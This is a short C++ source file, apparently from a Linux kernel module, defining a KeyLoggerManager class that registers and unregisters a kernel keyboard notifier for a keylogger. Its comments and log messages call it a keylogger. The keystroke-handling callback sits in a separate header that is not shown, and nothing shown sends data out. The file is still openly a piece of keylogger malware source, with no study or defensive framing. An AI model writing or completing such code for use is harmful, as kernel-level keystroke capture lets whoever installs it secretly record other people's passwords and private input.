extern "C" {
#include <linux/kernel.h>  // For printk and KERN_INFO
#include <linux/module.h>  // For module-related macros
#include "KeyLogger.h"     // Your C header
}

#include "KeyLoggerManager.hpp"  // Your C++ header


// Constructor: Registers the keylogger notifier
KeyLoggerManager::KeyLoggerManager() : isRegistered(false) {
    printk(KERN_INFO "KeyLoggerManager: Initializing keylogger\n");

    int ret = register_keyboard_notifier(&keylogger_nb);
    if (ret == 0) {
        printk(KERN_INFO "KeyLoggerManager: Keylogger registered successfully\n");
        isRegistered = true;
    } else {
        printk(KERN_ERR "KeyLoggerManager: Failed to register keylogger\n");
    }
}

// Destructor: Unregisters the keylogger notifier
KeyLoggerManager::~KeyLoggerManager() {
    if (isRegistered) {
        printk(KERN_INFO "KeyLoggerManager: Unregistering keylogger\n");
        unregister_keyboard_notifier(&keylogger_nb);
        printk(KERN_INFO "KeyLoggerManager: Keylogger unregistered successfully\n");
    }
}
